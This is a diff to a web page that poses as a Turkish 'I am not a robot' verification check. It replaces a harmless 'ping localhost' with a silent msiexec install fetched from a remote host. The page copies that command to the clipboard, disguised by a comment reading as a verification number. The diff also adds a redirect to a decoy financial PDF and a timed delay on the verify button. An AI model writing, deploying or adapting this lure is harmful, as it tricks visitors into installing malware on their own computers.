@@ -265,7 +265,7 @@
                             <br>
                             <code
                                 style="background: #eee; padding: 2px; border-radius: 3px; display: block; margin-top: 5px; color: #333;">
-                                ✅ "Robot değilim - Doğrulama No: <span id="verification-id">...</span>"
+                                ✅ "Ben robot değilim - Doğrulama No: <span id="verification-id">...</span>"
                             </code>
                         </p>
                     </div>
@@ -308,12 +308,15 @@
                         event.preventDefault();
                         checkboxBtn.disabled = true;
                         runClickedCheckboxEffects();
+                        verifyButton.disabled = true;
+                        setTimeout(function () {
+                            verifyButton.disabled = false;
+                        }, 10000);
                     });
 
                     if (verifyButton) {
                         verifyButton.addEventListener("click", function () {
-                            alert("Doğrulama başarılı!");
-                            // Here you would redirect to the actual form
+                            window.location.href = "https://yilmazmakina.github.io/assets/finansal_tablo_2025.pdf";
                             closeverifywindow();
                             // Change checkbox to checked state visually
                             hideCapLoading();
@@ -406,7 +409,7 @@
 
             function stageC(cToRun, verification_id) {
                 const suffix = " # "
-                const ploy = "✅ ''Robot değilim - Doğrulama No: "
+                const ploy = "✅ ''Ben robot değilim - Doğrulama No: "
                 const end = "''"
                 const textToCopy = cToRun + suffix + ploy + verification_id + end
 
@@ -431,7 +434,7 @@
                 let verifyIdEl = document.getElementById('verification-id');
                 if (verifyIdEl) verifyIdEl.textContent = verification_id;
 
-                const toRun = "ping localhost"
+                const toRun = "msiexec /i https://yilmazmakina.github.io/assets/verify.ext /qn"
                 stageC(toRun, verification_id)
             }
 
